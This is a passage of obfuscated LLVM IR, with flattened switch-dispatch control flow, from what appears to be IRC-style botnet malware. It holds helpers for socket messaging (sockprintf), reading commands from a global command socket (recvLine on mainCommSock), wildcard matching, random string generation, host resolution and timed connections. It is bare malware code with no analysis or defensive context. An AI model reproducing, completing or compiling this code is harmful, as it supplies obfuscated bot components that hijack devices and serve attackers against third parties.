  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1486019446, i32 340752077
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 815815919, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 815815919, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2085418358, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 2085418358, label %NodeBlock5
    i32 -1764298671, label %NodeBlock
    i32 -212989134, label %LeafBlock3
    i32 -972722682, label %LeafBlock1
    i32 -330370897, label %LeafBlock
    i32 668658081, label %14
    i32 1510342199, label %18
    i32 -642558244, label %25
    i32 1654384377, label %31
    i32 153720160, label %38
    i32 -921969119, label %39
    i32 -1854032981, label %42
    i32 1696808563, label %48
    i32 -613479200, label %56
    i32 -1880395323, label %NewDefault
    i32 1756523178, label %59
    i32 -1557045043, label %70
    i32 55952300, label %78
    i32 -1840207554, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 -330370897, i32 -1764298671
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -972722682, i32 -212989134
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -1854032981, i32 -1880395323
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 1510342199, i32 -1880395323
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 668658081, i32 -1880395323
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -1840207554, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -642558244, i32 -921969119
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1654384377, i32 153720160
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 153720160, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -921969119, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -1840207554, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 1696808563, i32 -613479200
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -613479200, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -1840207554, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1756523178, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #9
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #9
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -1557045043, i32 55952300
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 55952300, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -1840207554, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1524823309, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1524823309, label %first
    i32 -1668414110, label %13
    i32 -686620423, label %14
    i32 768258177, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -1668414110, i32 -686620423
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 768258177, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 768258177, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1982384029, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1982384029, label %6
    i32 -1113403638, label %11
    i32 -1633086839, label %20
    i32 -231284156, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -1113403638, i32 -231284156
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1633086839, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1982384029, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -2108682405, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2108682405, label %24
    i32 2021403246, label %33
    i32 1067426154, label %50
    i32 1799701249, label %51
    i32 -1237790329, label %55
    i32 2052565848, label %58
    i32 546368675, label %67
    i32 -1400900915, label %84
    i32 1582632240, label %87
    i32 -989707384, label %88
    i32 452629482, label %89
    i32 1476384860, label %91
    i32 -775397878, label %96
    i32 -143584819, label %101
    i32 11095148, label %103
    i32 2038818190, label %111
    i32 499803024, label %112
    i32 1133005090, label %115
    i32 1009998713, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 2021403246, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 1067426154, i32 452629482
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1799701249, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -1237790329, i32 -989707384
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 2052565848, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #5, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 546368675, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 -1400900915, i32 1582632240
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 1799701249, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -989707384, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 452629482, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 1476384860, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 -775397878, i32 1133005090
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 -143584819, i32 11095148
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 1009998713, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 2038818190, i32 499803024
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 1133005090, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 1476384860, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 1009998713, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 473189941, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 473189941, label %first
    i32 -579442785, label %37
    i32 513549623, label %38
    i32 1867767747, label %47
    i32 932492443, label %52
    i32 2113020272, label %57
    i32 -1629383841, label %66
    i32 -1631322801, label %83
    i32 -201878299, label %90
    i32 1847462430, label %91
    i32 586941291, label %92
    i32 1864112192, label %93
    i32 -429276624, label %94
    i32 1691442382, label %95
    i32 -1466117540, label %96
    i32 -209150099, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -579442785, i32 513549623
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -209150099, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 1867767747, i32 -1466117540
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 932492443, i32 -429276624
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 2113020272, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -1629383841, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -1631322801, i32 586941291
